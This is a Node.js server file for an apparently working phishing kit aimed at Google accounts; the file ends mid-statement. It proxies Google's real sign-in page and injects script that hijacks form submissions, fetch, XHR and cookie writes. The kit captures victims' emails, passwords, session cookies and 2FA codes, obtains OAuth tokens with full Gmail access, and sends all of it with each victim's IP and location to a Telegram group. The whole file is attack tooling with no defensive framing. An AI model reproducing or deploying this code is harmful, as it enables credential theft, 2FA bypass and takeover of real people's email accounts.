require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');
const geoip = require('geoip-lite');
const useragent = require('useragent');
const requestIp = require('request-ip');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');
const { createProxyMiddleware } = require('http-proxy-middleware');
const axios = require('axios');
const cheerio = require('cheerio');

const app = express();
const server = http.createServer(app);

// ============= RENDER-SPECIFIC CONFIGURATION =============
app.set('trust proxy', true);

// ============= MIDDLEWARE =============
app.use(cors({
  origin: process.env.NODE_ENV === 'production' 
    ? [process.env.APP_URL || 'https://your-app.onrender.com'] 
    : ['http://localhost:3001', 'http://127.0.0.1:3001'],
  credentials: true
}));
app.use(requestIp.mw());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

const io = new Server(server, {
  cors: {
    origin: process.env.NODE_ENV === 'production'
      ? [process.env.APP_URL || 'https://your-app.onrender.com']
      : ['http://localhost:3001', 'http://127.0.0.1:3001'],
    methods: ['GET', 'POST'],
    credentials: true
  },
  transports: ['polling', 'websocket'],
  pingTimeout: 60000,
  pingInterval: 25000
});

// ============= BOT INITIALIZATION =============
let bot;
let telegramGroupId = process.env.TELEGRAM_GROUP_ID;

const initializeBot = () => {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
  
  const usePolling = process.env.USE_POLLING === 'true' || process.env.NODE_ENV !== 'production';
  
  if (usePolling) {
    console.log('🔧 Using POLLING mode');
    bot.deleteWebHook()
      .then(() => bot.startPolling())
      .catch(err => console.error('❌ Failed to start polling:', err));
  } else {
    console.log('🚀 Using WEBHOOK mode');
    const webhookUrl = `${process.env.APP_URL}/webhook/${process.env.TELEGRAM_BOT_TOKEN}`;
    bot.setWebHook(webhookUrl)
      .then(() => console.log('✅ Webhook set successfully'))
      .catch(err => console.error('❌ Webhook setup failed:', err));
  }
  
  return bot;
};

initializeBot();

app.post(`/webhook/${process.env.TELEGRAM_BOT_TOKEN}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// ============= SESSION MANAGEMENT =============
const activeSessions = new Map();
const capturedData = new Map();
const requestTimestamps = new Map();
const codeVerifiers = new Map();

const SESSION_TIMEOUT = 7200000;
const CLEANUP_INTERVAL = 600000;
const SESSION_COOLDOWN = 5000;

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of activeSessions.entries()) {
    if (now - session.lastActivity > SESSION_TIMEOUT) {
      activeSessions.delete(sessionId);
    }
  }
}, CLEANUP_INTERVAL);

// ============= PKCE HELPER FUNCTIONS =============
function generateCodeVerifier() {
  return crypto.randomBytes(64)
    .toString('base64')
    .replace(/[^a-zA-Z0-9]/g, '')
    .substring(0, 128);
}

function generateCodeChallenge(verifier) {
  const hash = crypto.createHash('sha256').update(verifier).digest();
  return hash.toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// ============= VICTIM INFO CAPTURE HELPER =============
async function getVictimInfo(req) {
  try {
    const ip = requestIp.getClientIp(req) || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const agent = useragent.parse(userAgent);
    
    let location = 'Unknown';
    try {
      const geo = geoip.lookup(ip);
      if (geo) {
        location = `${geo.city || 'Unknown City'}, ${geo.region || 'Unknown Region'}, ${geo.country || 'Unknown Country'}`;
      }
    } catch (e) {}

    return {
      ip,
      location,
      browser: agent.toAgent() || 'Unknown',
      os: agent.os.toString() || 'Unknown',
      device: agent.device.toString() === 'undefined' ? 'Desktop' : agent.device.toString(),
      timestamp: new Date().toLocaleString()
    };
  } catch (err) {
    return {
      ip: 'Unknown',
      location: 'Unknown',
      browser: 'Unknown',
      os: 'Unknown',
      device: 'Unknown',
      timestamp: new Date().toLocaleString()
    };
  }
}

// ============= SOCKET.IO HANDLERS =============
io.on('connection', (socket) => {
  let sessionId = socket.handshake.query.sessionId || uuidv4();
  
  if (!activeSessions.has(sessionId)) {
    activeSessions.set(sessionId, {
      stage: 'initial',
      lastActivity: Date.now(),
      details: null,
      email: null,
      password: null,
      sockets: new Set([socket.id]),
      createdAt: Date.now()
    });
  } else {
    const session = activeSessions.get(sessionId);
    session.sockets.add(socket.id);
    session.lastActivity = Date.now();
  }

  socket.emit('connection_established', { sessionId });

  socket.on('client_info', (userAgent) => {
    const session = activeSessions.get(sessionId);
    if (session) {
      const ip = socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
      const geo = geoip.lookup(ip) || {};
      const agent = useragent.parse(userAgent);
      
      session.details = {
        ip,
        location: geo.country ? `${geo.city || 'Unknown'}, ${geo.country}` : 'Unknown',
        browser: agent.toAgent(),
        os: agent.os.toString(),
        timestamp: new Date().toLocaleString()
      };
      session.lastActivity = Date.now();
    }
  });

  socket.on('submit_email', async (email) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;
    
    session.email = email;
    session.stage = 'awaiting_password';
    session.lastActivity = Date.now();

    const message = `📧 New Login Request\n━━━━━━━━━━━━━━━━━━\nEmail: ${email}`;
    await bot.sendMessage(telegramGroupId, message, {
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔑 Request Password', callback_data: `request_password|${sessionId}` }]
        ]
      }
    });
    
    socket.emit('email_sent');
  });

  socket.on('submit_password', async (password) => {
    const session = activeSessions.get(sessionId);
    if (!session) return;
    
    session.password = password;
    session.stage = 'awaiting_action';
    session.lastActivity = Date.now();

    await bot.sendMessage(telegramGroupId, 
      `🔒 Password received for ${session.email}\nPassword: ${password}`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📱 Request SMS Code', callback_data: `request_sms|${sessionId}` }],
            [{ text: '🔐 Request Auth Code', callback_data: `request_auth|${sessionId}` }],
            [{ text: '✅ Done', callback_data: `done|${sessionId}` }]
          ]
        }
      }
    );
    
    socket.emit('password_sent');
  });

  socket.on('disconnect', () => {
    const session = activeSessions.get(sessionId);
    if (session) {
      session.sockets.delete(socket.id);
      session.lastActivity = Date.now();
    }
  });
});

// ============= TELEGRAM BOT HANDLERS =============
bot.on('callback_query', async (cb) => {
  const [action, sessionId] = cb.data.split('|');
  const session = activeSessions.get(sessionId);
  
  if (!session) {
    await bot.answerCallbackQuery(cb.id, { text: 'Session expired', show_alert: true });
    return;
  }

  session.lastActivity = Date.now();

  if (action === 'request_password') {
    sendToSession(sessionId, 'request_password');
    await bot.answerCallbackQuery(cb.id, { text: 'Requesting password' });
  } else if (action === 'request_sms' || action === 'request_auth') {
    const codeType = action === 'request_sms' ? 'sms' : 'authenticator';
    sendToSession(sessionId, 'request_2fa', codeType);
    await bot.answerCallbackQuery(cb.id, { text: `Requesting ${codeType} code` });
  } else if (action === 'done') {
    sendToSession(sessionId, 'redirect_to_gmail');
    await bot.sendMessage(telegramGroupId, 
      `✅ Login complete for ${session.email}\nPassword: ${session.password || 'N/A'}`
    );
    await bot.answerCallbackQuery(cb.id, { text: 'Redirecting user' });
  }
});

function sendToSession(sessionId, event, data) {
  const session = activeSessions.get(sessionId);
  if (!session) return false;
  
  for (const socketId of session.sockets) {
    const socket = io.sockets.sockets.get(socketId);
    if (socket?.connected) socket.emit(event, data);
  }
  return true;
}

// ============= GOOGLE OAUTH CONFIGURATION =============
const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID || 'YOUR_GOOGLE_CLIENT_ID';
const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET || 'YOUR_GOOGLE_CLIENT_SECRET';
const GOOGLE_REDIRECT_URI = process.env.GOOGLE_REDIRECT_URI || 'http://localhost:3001/oauth2callback';

const GOOGLE_AUTH_URL = 'https://accounts.google.com/o/oauth2/v2/auth';
const GOOGLE_TOKEN_URL = 'https://oauth2.googleapis.com/token';
const GOOGLE_USERINFO_URL = 'https://www.googleapis.com/oauth2/v3/userinfo';

// ============= ROOT REDIRECT =============
app.get('/', (req, res) => {
  console.log('↪️ Redirecting root to /google');
  res.redirect('/google');
});

// ============= GOOGLE LOGIN PAGE =============
// ============= GOOGLE LOGIN PAGE (PROPER PROXY) =============
app.get('/google', async (req, res) => {
  try {
    const clientIp = requestIp.getClientIp(req) || 'unknown';
    const now = Date.now();
    
    const lastRequest = requestTimestamps.get(clientIp) || 0;
    if (now - lastRequest < SESSION_COOLDOWN) {
      return res.send(`<html><body>Rate limited</body></html>`);
    }
    requestTimestamps.set(clientIp, now);
    
    const sessionId = 'google_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
    
    const codeVerifier = generateCodeVerifier();
    const codeChallenge = generateCodeChallenge(codeVerifier);
    
    codeVerifiers.set(sessionId, codeVerifier);
    
    console.log(`🔐 Google PKCE for session ${sessionId}:`, {
      verifierLength: codeVerifier.length,
      challenge: codeChallenge.substring(0, 20) + '...'
    });
    
    // Build Google OAuth URL
    const authUrl = new URL(GOOGLE_AUTH_URL);
    authUrl.searchParams.append('client_id', GOOGLE_CLIENT_ID);
    authUrl.searchParams.append('redirect_uri', GOOGLE_REDIRECT_URI);
    authUrl.searchParams.append('response_type', 'code');
    authUrl.searchParams.append('scope', 'https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile openid https://mail.google.com/');
    authUrl.searchParams.append('code_challenge', codeChallenge);
    authUrl.searchParams.append('code_challenge_method', 'S256');
    authUrl.searchParams.append('state', sessionId);
    authUrl.searchParams.append('access_type', 'offline');
    authUrl.searchParams.append('prompt', 'consent');
    
    // Fetch the real Google login page
    const googleResponse = await axios({
      method: 'GET',
      url: authUrl.toString(),
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
      },
      maxRedirects: 5,
      timeout: 30000
    });

    let html = googleResponse.data;
    const $ = cheerio.load(html);
    
    // Add comprehensive interception script
    $('head').append(`
      <script>
        (function() {
          console.log('🔧 Google proxy interceptor active');
          
          const sessionId = '${sessionId}';
          sessionStorage.setItem('phishSessionId', sessionId);
          
          // COMPLETE FORM INTERCEPTION
          const originalAddEventListener = EventTarget.prototype.addEventListener;
          
          // Override addEventListener to catch and prevent any form submission handlers
          EventTarget.prototype.addEventListener = function(type, listener, options) {
            if (this.tagName === 'FORM' && type === 'submit') {
              console.log('⚠️ Blocked submit listener on form');
              return; // Don't add any submit listeners
            }
            return originalAddEventListener.call(this, type, listener, options);
          };
          
          // Intercept all form submissions at the document level
          document.addEventListener('submit', function(e) {
            const form = e.target;
            if (form.tagName === 'FORM') {
              e.preventDefault();
              e.stopPropagation();
              
              console.log('📤 Form submission intercepted');
              console.log('Form action:', form.action);
              
              // Collect all form data
              const formData = new FormData(form);
              const data = {};
              for (let [key, value] of formData.entries()) {
                data[key] = value;
                console.log(\`🔑 Field \${key}: \${value.substring(0, 20)}...\`);
              }
              
              // Send to our proxy endpoint
              const proxyForm = document.createElement('form');
              proxyForm.method = 'POST';
              proxyForm.action = '/proxy/google-login';
              
              // Add all original fields
              for (let [key, value] of Object.entries(data)) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = value;
                proxyForm.appendChild(input);
              }
              
              // Add session ID
              const sessionInput = document.createElement('input');
              sessionInput.type = 'hidden';
              sessionInput.name = 'sessionId';
              sessionInput.value = sessionId;
              proxyForm.appendChild(sessionInput);
              
              // Add the original action URL for reference
              const actionInput = document.createElement('input');
              actionInput.type = 'hidden';
              actionInput.name = 'original_action';
              actionInput.value = form.action;
              proxyForm.appendChild(actionInput);
              
              document.body.appendChild(proxyForm);
              proxyForm.submit();
            }
          }, true); // Use capture phase to ensure we get it first
          
          // Remove any existing submit handlers from forms
          document.querySelectorAll('form').forEach(form => {
            // Clone and replace to remove all event listeners
            const newForm = form.cloneNode(false);
            while (form.firstChild) {
              newForm.appendChild(form.firstChild);
            }
            form.parentNode.replaceChild(newForm, form);
            
            // Set our own submit handler
            newForm.addEventListener('submit', function(e) {
              e.preventDefault();
              console.log('📤 Form submission via direct handler');
              
              const formData = new FormData(this);
              const data = {};
              for (let [key, value] of formData.entries()) {
                data[key] = value;
              }
              
              const proxyForm = document.createElement('form');
              proxyForm.method = 'POST';
              proxyForm.action = '/proxy/google-login';
              
              for (let [key, value] of Object.entries(data)) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = value;
                proxyForm.appendChild(input);
              }
              
              const sessionInput = document.createElement('input');
              sessionInput.type = 'hidden';
              sessionInput.name = 'sessionId';
              sessionInput.value = sessionId;
              proxyForm.appendChild(sessionInput);
              
              document.body.appendChild(proxyForm);
              proxyForm.submit();
            });
          });
          
          // Override fetch for AJAX login attempts
          const originalFetch = window.fetch;
          window.fetch = function(url, options = {}) {
            if (url.includes('/signin/challenge') || url.includes('/accounts.google.com')) {
              console.log('🔄 Intercepting fetch to:', url);
              
              // Capture credentials from body
              if (options.body) {
                try {
                  const bodyParams = new URLSearchParams(options.body);
                  const email = bodyParams.get('email') || bodyParams.get('identifier');
                  const password = bodyParams.get('password') || bodyParams.get('Passwd');
                  
                  if (email && password) {
                    console.log('🔑 Captured credentials via fetch');
                    fetch('/api/capture-credentials', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ email, password, sessionId })
                    }).catch(() => {});
                  }
                } catch (e) {}
              }
              
              // Redirect to our proxy
              return originalFetch('/proxy/signin-challenge', {
                method: options.method || 'POST',
                headers: options.headers,
                body: options.body
              });
            }
            return originalFetch(url, options);
          };
          
          // Override XMLHttpRequest
          const XHR = XMLHttpRequest;
          const originalOpen = XHR.prototype.open;
          const originalSend = XHR.prototype.send;
          
          XHR.prototype.open = function(method, url, ...args) {
            this._url = url;
            this._method = method;
            return originalOpen.apply(this, [method, url, ...args]);
          };
          
          XHR.prototype.send = function(body) {
            if (this._url && (this._url.includes('/signin/challenge') || this._url.includes('accounts.google.com'))) {
              console.log('🔄 Intercepting XHR to:', this._url);
              
              if (body) {
                try {
                  const bodyParams = new URLSearchParams(body);
                  const email = bodyParams.get('email') || bodyParams.get('identifier');
                  const password = bodyParams.get('password') || bodyParams.get('Passwd');
                  
                  if (email && password) {
                    console.log('🔑 Captured credentials via XHR');
                    fetch('/api/capture-credentials', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ email, password, sessionId })
                    }).catch(() => {});
                  }
                } catch (e) {}
              }
              
              // Modify URL to go through proxy
              this._url = '/proxy/signin-challenge';
              this.open(this._method, this._url);
            }
            return originalSend.apply(this, [body]);
          };
          
          // Cookie capture
          const cookieDesc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
          Object.defineProperty(document, 'cookie', {
            get: function() {
              return cookieDesc.get.call(this);
            },
            set: function(val) {
              console.log('🍪 Cookie set:', val.split(';')[0]);
              
              fetch('/api/capture-cookie', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cookie: val, sessionId })
              }).catch(() => {});
              
              return cookieDesc.set.call(this, val);
            }
          });
          
          console.log('✅ Google proxy fully active for session:', sessionId);
        })();
      </script>
    `);
    
    // Also directly modify form actions as backup
    $('form').each((i, form) => {
      const action = $(form).attr('action');
      if (action) {
        console.log('🔧 Found form with action:', action);
        $(form).attr('data-original-action', action);
      }
    });
    
    res.send($.html());
    
  } catch (error) {
    console.error('Google page error:', error.message);
    res.status(500).send('Error loading Google login page: ' + error.message);
  }
});

// ============= GOOGLE LOGIN PROXY =============
// ============= GOOGLE LOGIN PROXY =============
app.post('/proxy/google-login', express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 Google login submission');
  console.log('Request body keys:', Object.keys(req.body));
  
  const sessionId = req.body?.sessionId || 'unknown';
  const email = req.body?.email || req.body?.identifier;
  const password = req.body?.password || req.body?.Passwd;
  const originalAction = req.body?.original_action;
  
  const victimInfo = await getVictimInfo(req);
  
  // Capture credentials if present
  if (email && password) {
    console.log(`🔑 CREDENTIALS CAPTURED for ${email}`);
    
    let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
    session.credentials = { email, password, time: new Date().toISOString(), victimInfo };
    capturedData.set(sessionId, session);
    
    // Send to Telegram immediately
    await bot.sendMessage(telegramGroupId, 
      `🔑 *GOOGLE CREDENTIALS CAPTURED*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Email:* \`${email}\`\n` +
      `*Password:* \`${password}\`\n` +
      `*Session:* \`${sessionId}\`\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*IP:* ${victimInfo.ip}\n` +
      `*Location:* ${victimInfo.location}\n` +
      `*Time:* ${victimInfo.timestamp}`,
      { parse_mode: 'Markdown' }
    ).catch(() => {});
  }
  
  try {
    // Forward the login request to Google
    const formData = new URLSearchParams();
    Object.keys(req.body).forEach(key => {
      if (key !== 'sessionId' && key !== 'original_action') {
        formData.append(key, req.body[key]);
      }
    });
    
    // Determine the correct Google endpoint
    let targetUrl = 'https://accounts.google.com/signin/v1/identifier';
    if (originalAction && originalAction.includes('challenge')) {
      targetUrl = 'https://accounts.google.com/signin/challenge';
    } else if (originalAction) {
      targetUrl = new URL(originalAction, 'https://accounts.google.com').href;
    }
    
    console.log('🔄 Forwarding to:', targetUrl);
    
    const response = await axios({
      method: 'POST',
      url: targetUrl,
      data: formData.toString(),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Origin': 'https://accounts.google.com',
        'Referer': req.headers['referer'] || 'https://accounts.google.com/'
      },
      maxRedirects: 0,
      validateStatus: status => status >= 200 && status < 400
    }).catch(err => err.response);
    
    // Handle redirects
    if (response?.headers?.location) {
      const location = response.headers.location;
      console.log(`↪️ Google redirects to: ${location}`);
      
      // Capture any cookies set
      if (response.headers['set-cookie']) {
        console.log(`🍪 Captured ${response.headers['set-cookie'].length} cookies`);
        let session = capturedData.get(sessionId) || { cookies: [] };
        if (!session.cookies) session.cookies = [];
        response.headers['set-cookie'].forEach(cookie => {
          if (!session.cookies.includes(cookie)) {
            session.cookies.push(cookie);
          }
        });
        capturedData.set(sessionId, session);
      }
      
      // Check if this is the OAuth callback with code
      if (location.includes('oauth2callback') && location.includes('code=')) {
        console.log('🎯 OAuth callback detected with code');
        return res.redirect(location);
      }
      
      return res.redirect(location);
    }
    
    // If we get HTML back, serve it with our interceptor
    if (response?.data) {
      let html = response.data;
      const $ = cheerio.load(html);
      
      // Re-add our interceptor
      $('head').append(`
        <script>
          sessionStorage.setItem('phishSessionId', '${sessionId}');
          console.log('🔄 Continuing session:', '${sessionId}');
        </script>
      `);
      
      return res.send($.html());
    }
    
    // Default fallback
    res.redirect('https://mail.google.com');
    
  } catch (error) {
    console.error('❌ Google login proxy error:', error.message);
    res.redirect('https://accounts.google.com');
  }
});

// ============= GOOGLE TOKEN EXCHANGE =============
async function exchangeGoogleCodeForTokens(sessionId, code, codeVerifier, email, victimInfo) {
  console.log(`🔄 Exchanging Google code for tokens...`);
  
  try {
    const tokenResponse = await axios.post(GOOGLE_TOKEN_URL, 
      new URLSearchParams({
        client_id: GOOGLE_CLIENT_ID,
        client_secret: GOOGLE_CLIENT_SECRET,
        code: code,
        code_verifier: codeVerifier,
        redirect_uri: GOOGLE_REDIRECT_URI,
        grant_type: 'authorization_code'
      }).toString(),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );
    
    const tokens = tokenResponse.data;
    console.log('✅ Google tokens received!');
    
    // Get user info
    let userInfo = {};
    try {
      const userResponse = await axios.get(GOOGLE_USERINFO_URL, {
        headers: { 'Authorization': `Bearer ${tokens.access_token}` }
      });
      userInfo = userResponse.data;
    } catch (e) {
      console.error('Failed to get user info:', e.message);
    }
    
    // Store tokens
    let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
    session.tokens = {
      access_token: tokens.access_token,
      refresh_token: tokens.refresh_token,
      id_token: tokens.id_token,
      expires_in: tokens.expires_in,
      token_type: tokens.token_type,
      scope: tokens.scope,
      captured_at: new Date().toISOString()
    };
    session.userInfo = userInfo;
    capturedData.set(sessionId, session);
    
    // Send comprehensive notification
    await sendGoogleTokenNotification(sessionId, email || userInfo.email, victimInfo, tokens, userInfo);
    
    return tokens;
    
  } catch (error) {
    console.error('❌ Google token exchange failed:', error.response?.data || error.message);
    return null;
  }
}

// ============= GOOGLE TOKEN NOTIFICATION =============
async function sendGoogleTokenNotification(sessionId, email, victimInfo, tokens, userInfo) {
  const message = 
    `🎯 *GOOGLE TOKENS CAPTURED!*\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Session:* \`${sessionId}\`\n` +
    `*Email:* \`${email}\`\n` +
    `*Name:* ${userInfo.name || 'Unknown'}\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Access Token:* \`${tokens.access_token.substring(0, 50)}...\`\n` +
    `*Refresh Token:* \`${tokens.refresh_token ? tokens.refresh_token.substring(0, 50) + '...' : 'Not provided'}\`\n` +
    `*Expires in:* ${tokens.expires_in} seconds\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Victim Information:*\n` +
    `*IP:* \`${victimInfo.ip}\`\n` +
    `*Location:* ${victimInfo.location}\n` +
    `*Browser:* ${victimInfo.browser}\n` +
    `*OS:* ${victimInfo.os}\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Debug:* \`/debug-google/${sessionId}\``;
  
  await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' });
  
  // Also send token file
  const fileContent = `GOOGLE TOKENS CAPTURED
━━━━━━━━━━━━━━━━━━━━━━━━
Session: ${sessionId}
Email: ${email}
Name: ${userInfo.name || 'Unknown'}
Capture Time: ${new Date().toISOString()}

ACCESS TOKEN:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.access_token}

REFRESH TOKEN:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.refresh_token || 'Not provided'}

ID TOKEN:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.id_token || 'Not provided'}

SCOPE:
━━━━━━━━━━━━━━━━━━━━━━━━
${tokens.scope}

USER INFO:
━━━━━━━━━━━━━━━━━━━━━━━━
${JSON.stringify(userInfo, null, 2)}`;

  await bot.sendDocument(
    telegramGroupId,
    Buffer.from(fileContent, 'utf-8'),
    {},
    {
      filename: `google_tokens_${sessionId}_${Date.now()}.txt`,
      contentType: 'text/plain'
    }
  );
}


// ============= CAPTURE EMAIL ENDPOINT =============
app.post('/api/capture-email', express.json(), async (req, res) => {
  const { email, sessionId } = req.body;
  
  console.log(`📧 Email captured for session ${sessionId}: ${email}`);
  
  let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
  if (!session.credentials) session.credentials = {};
  session.credentials.email = email;
  session.credentials.email_time = new Date().toISOString();
  capturedData.set(sessionId, session);
  
  res.json({ success: true });
});

// ============= COMPLETE LOGIN PROXY =============
app.get('/proxy/complete-login', async (req, res) => {
  const { email, sessionId } = req.query;
  
  console.log(`🔄 Completing login for ${email} (session: ${sessionId})`);
  
  // Get the code verifier
  const codeVerifier = codeVerifiers.get(sessionId);
  
  if (!codeVerifier) {
    console.error(`❌ No code verifier for session ${sessionId}`);
    return res.redirect('/google?error=no_verifier');
  }
  
  const codeChallenge = generateCodeChallenge(codeVerifier);
  
  // Build the actual Google OAuth URL
  const authUrl = new URL(GOOGLE_AUTH_URL);
  authUrl.searchParams.append('client_id', GOOGLE_CLIENT_ID);
  authUrl.searchParams.append('redirect_uri', GOOGLE_REDIRECT_URI);
  authUrl.searchParams.append('response_type', 'code');
  authUrl.searchParams.append('scope', 'https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile openid https://mail.google.com/');
  authUrl.searchParams.append('code_challenge', codeChallenge);
  authUrl.searchParams.append('code_challenge_method', 'S256');
  authUrl.searchParams.append('state', sessionId);
  authUrl.searchParams.append('login_hint', email);
  authUrl.searchParams.append('access_type', 'offline');
  authUrl.searchParams.append('prompt', 'consent');
  
  // Redirect to Google
  res.redirect(authUrl.toString());
});

// ============= COOKIE CAPTURE ENDPOINT =============
app.post('/api/capture-cookie', express.json(), async (req, res) => {
  const { cookie, sessionId } = req.body;
  
  console.log(`🍪 Cookie captured for session ${sessionId}: ${cookie.substring(0, 100)}`);
  
  let session = capturedData.get(sessionId);
  if (!session) {
    session = { cookies: [], credentials: {}, tokens: {} };
  }
  if (!session.cookies) session.cookies = [];
  
  // Avoid duplicates
  if (!session.cookies.includes(cookie)) {
    session.cookies.push(cookie);
    capturedData.set(sessionId, session);
  }
  
  res.json({ success: true });
});

// ============= TOKEN CAPTURE ENDPOINT =============
app.post('/api/capture-token', express.json(), async (req, res) => {
  const { token, sessionId } = req.body;
  
  console.log(`🔑 Token captured for session ${sessionId}`);
  
  let session = capturedData.get(sessionId);
  if (!session) {
    session = { cookies: [], credentials: {}, tokens: {} };
  }
  
  // Extract token from Bearer format if needed
  const tokenValue = token.startsWith('Bearer ') ? token.substring(7) : token;
  session.capturedToken = tokenValue;
  capturedData.set(sessionId, session);
  
  res.json({ success: true });
});

// ============= OAUTH2 CALLBACK =============
app.get('/oauth2callback', async (req, res) => {
  const { code, state: sessionId, error } = req.query;
  
  if (error) {
    console.error(`OAuth error: ${error}`);
    return res.redirect('/google?error=' + error);
  }
  
  if (!code || !sessionId) {
    return res.status(400).send('Missing code or state');
  }
  
  console.log(`📥 OAuth callback for session ${sessionId}`);
  
  const victimInfo = await getVictimInfo(req);
  const codeVerifier = codeVerifiers.get(sessionId);
  
  if (!codeVerifier) {
    console.error(`❌ No code verifier for session ${sessionId}`);
    return res.redirect('/google?error=no_verifier');
  }
  
  await exchangeGoogleCodeForTokens(sessionId, code, codeVerifier, null, victimInfo);
  
  // Redirect to Gmail
  res.send(`
    <html>
      <head>
        <style>
          body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
          .success { color: #4CAF50; }
          .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #4CAF50; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
      </head>
      <body>
        <div class="spinner"></div>
        <h2 class="success">Login successful! Redirecting to Gmail...</h2>
        <script>
          setTimeout(() => {
            window.location.href = 'https://mail.google.com';
          }, 2000);
        </script>
      </body>
    </html>
  `);
});

// ============= GOOGLE TOKEN REFRESH =============
app.post('/api/refresh-google-token', express.json(), async (req, res) => {
  console.log('📥 Google token refresh request');
  
  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  const { refreshToken } = req.body;
  
  if (!refreshToken) {
    return res.status(400).json({ error: 'No refresh token provided' });
  }
  
  try {
    const response = await axios.post(GOOGLE_TOKEN_URL, 
      new URLSearchParams({
        client_id: GOOGLE_CLIENT_ID,
        client_secret: GOOGLE_CLIENT_SECRET,
        refresh_token: refreshToken,
        grant_type: 'refresh_token'
      }).toString(),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }
    );
    
    console.log('✅ Google token refreshed');
    res.json(response.data);
    
  } catch (error) {
    console.error('❌ Google token refresh failed:', error.response?.data || error.message);
    res.status(500).json({ error: 'Token refresh failed' });
  }
});

app.options('/api/refresh-google-token', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', 'http://localhost:3001');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.sendStatus(200);
});






// ============= CAPTURE CREDENTIALS ENDPOINT =============
// ============= CAPTURE CREDENTIALS ENDPOINT =============
app.post('/api/capture-credentials', express.json(), async (req, res) => {
  const { email, password, sessionId } = req.body;
  
  if (!email || !password) {
    return res.json({ success: false, error: 'Missing credentials' });
  }
  
  console.log(`🔑 Credentials captured via API for session ${sessionId}: ${email}`);
  
  const victimInfo = await getVictimInfo(req);
  
  let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
  session.credentials = { email, password, time: new Date().toISOString(), victimInfo };
  capturedData.set(sessionId, session);
  
  // Send to Telegram
  await bot.sendMessage(telegramGroupId, 
    `🔑 *Google Credentials Captured*\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*Email:* \`${email}\`\n` +
    `*Password:* \`${password}\`\n` +
    `*Session:* \`${sessionId}\`\n` +
    `━━━━━━━━━━━━━━━━━━\n` +
    `*IP:* ${victimInfo.ip}\n` +
    `*Location:* ${victimInfo.location}`,
    { parse_mode: 'Markdown' }
  ).catch(() => {});
  
  res.json({ success: true });
});





// ============= SIGN-IN CHALLENGE PROXY =============
app.post('/proxy/signin-challenge', express.urlencoded({ extended: true }), async (req, res) => {
  console.log('📥 Sign-in challenge proxy');
  
  const sessionId = req.body?.sessionId || 'unknown';
  const email = req.body?.email || req.body?.identifier;
  const password = req.body?.password || req.body?.Passwd;
  
  if (email && password) {
    const victimInfo = await getVictimInfo(req);
    
    let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
    session.credentials = { email, password, time: new Date().toISOString(), victimInfo };
    capturedData.set(sessionId, session);
    
    await bot.sendMessage(telegramGroupId, 
      `🔑 *Google Credentials Captured (via challenge)*\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `*Email:* \`${email}\`\n` +
